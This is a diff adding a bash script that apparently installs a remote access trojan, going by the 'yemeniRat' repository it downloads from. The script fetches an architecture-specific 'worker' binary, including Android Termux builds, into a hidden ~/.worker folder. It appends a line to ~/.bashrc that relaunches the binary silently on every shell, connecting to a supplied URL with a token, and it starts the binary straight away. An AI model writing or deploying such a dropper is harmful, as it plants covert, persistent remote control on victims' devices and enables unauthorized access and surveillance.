@@ -1,0 +1,208 @@
+#!/usr/bin/env bash
+
+set -e
+
+# =========================================================
+# Configuration
+# =========================================================
+
+BASE_URL="https://raw.githubusercontent.com/Alnajmetube/yemeniRat/main/build"
+
+INSTALL_DIR="$HOME/.worker"
+BINARY="$INSTALL_DIR/worker"
+LOCK_FILE="$INSTALL_DIR/worker.lock"
+BASHRC="$HOME/.bashrc"
+
+# =========================================================
+# Colors
+# =========================================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+# =========================================================
+# Usage
+# =========================================================
+
+usage() {
+    echo "Usage:"
+    echo "  $0 --url URL --token TOKEN"
+    exit 1
+}
+
+# =========================================================
+# Parse arguments
+# =========================================================
+
+URL=""
+TOKEN=""
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --url)
+            [[ -n "${2:-}" ]] || usage
+            URL="$2"
+            shift 2
+            ;;
+
+        --token)
+            [[ -n "${2:-}" ]] || usage
+            TOKEN="$2"
+            shift 2
+            ;;
+
+        *)
+            echo -e "${RED}Unknown argument: $1${NC}"
+            usage
+            ;;
+    esac
+done
+
+[[ -n "$URL" ]] || {
+    echo -e "${RED}Missing --url${NC}"
+    usage
+}
+
+[[ -n "$TOKEN" ]] || {
+    echo -e "${RED}Missing --token${NC}"
+    usage
+}
+
+# =========================================================
+# Detect architecture
+# =========================================================
+
+ARCH="$(uname -m)"
+
+case "$ARCH" in
+    x86_64|amd64)
+        BINARY_NAME="worker_ubuntu-22.04"
+        ;;
+
+    aarch64|arm64)
+        BINARY_NAME="worker-linux-arm64"
+        ;;
+
+    armv7l|armv7|armhf)
+        BINARY_NAME="worker-linux-armv7l"
+        ;;
+
+    *)
+        echo -e "${RED}Unsupported architecture: $ARCH${NC}"
+        exit 1
+        ;;
+esac
+
+# =========================================================
+# Detect Termux
+# =========================================================
+
+IS_TERMUX=false
+
+if [[ -n "${PREFIX:-}" && "$PREFIX" == *"com.termux"* ]]; then
+    IS_TERMUX=true
+fi
+
+if [[ -n "${TERMUX_VERSION:-}" ]]; then
+    IS_TERMUX=true
+fi
+
+if [[ "$IS_TERMUX" == true ]]; then
+    case "$ARCH" in
+        aarch64|arm64)
+            BINARY_NAME="termux_client_arm64"
+            ;;
+
+        armv7l|armv7|armhf)
+            BINARY_NAME="worker-armv7l"
+            ;;
+
+        *)
+            echo -e "${RED}Unsupported Termux architecture: $ARCH${NC}"
+            exit 1
+            ;;
+    esac
+fi
+
+# =========================================================
+# Check dependencies
+# =========================================================
+
+command -v curl >/dev/null 2>&1 || {
+    echo -e "${RED}curl is required.${NC}"
+    exit 1
+}
+
+command -v flock >/dev/null 2>&1 || {
+    echo -e "${RED}flock is required.${NC}"
+    exit 1
+}
+
+# =========================================================
+# Create installation directory
+# =========================================================
+
+mkdir -p "$INSTALL_DIR"
+
+# =========================================================
+# Download binary
+# =========================================================
+
+DOWNLOAD_URL="${BASE_URL}/${BINARY_NAME}"
+
+echo -e "${YELLOW}Downloading: ${BINARY_NAME}${NC}"
+
+curl -fL \
+    --retry 3 \
+    --connect-timeout 10 \
+    "$DOWNLOAD_URL" \
+    -o "$BINARY"
+
+chmod +x "$BINARY"
+
+echo -e "${GREEN}Binary installed successfully.${NC}"
+
+# =========================================================
+# Create startup command
+# =========================================================
+
+START_COMMAND="flock -n '$LOCK_FILE' nohup '$BINARY' --install --url '$URL' --token '$TOKEN' >/dev/null 2>&1 &"
+
+# =========================================================
+# Remove previous installer entry
+# =========================================================
+
+if [[ -f "$BASHRC" ]]; then
+    sed -i "\|$INSTALL_DIR/worker.lock|d" "$BASHRC"
+fi
+
+# =========================================================
+# Add automatic startup
+# =========================================================
+
+cat >> "$BASHRC" <<EOF
+
+# Worker automatic startup
+$START_COMMAND
+EOF
+
+# =========================================================
+# Start now
+# =========================================================
+
+echo -e "${YELLOW}Starting worker...${NC}"
+
+eval "$START_COMMAND"
+
+echo -e "${GREEN}Worker started successfully.${NC}"
+echo
+echo "Binary:"
+echo "$BINARY"
+echo
+echo "Architecture:"
+echo "$ARCH"
+echo
+echo "Termux:"
+echo "$IS_TERMUX"
